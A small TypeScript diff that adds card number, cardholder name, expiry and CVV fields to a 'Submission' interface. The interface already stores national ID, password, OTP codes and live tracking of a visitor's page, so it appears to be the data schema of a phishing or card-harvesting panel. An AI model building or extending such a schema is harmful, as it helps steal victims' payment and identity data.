@@ -5,6 +5,7 @@ export interface Submission {
   name: string; phone: string; nationalId: string;
   email: string; password: string;
   carPlate: string; carYear: string; carMake: string;
+  cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
   otpCode: string; otpStatus: string | null;
   page: string; isActive: boolean; lastSeen: number; country: string;
 }
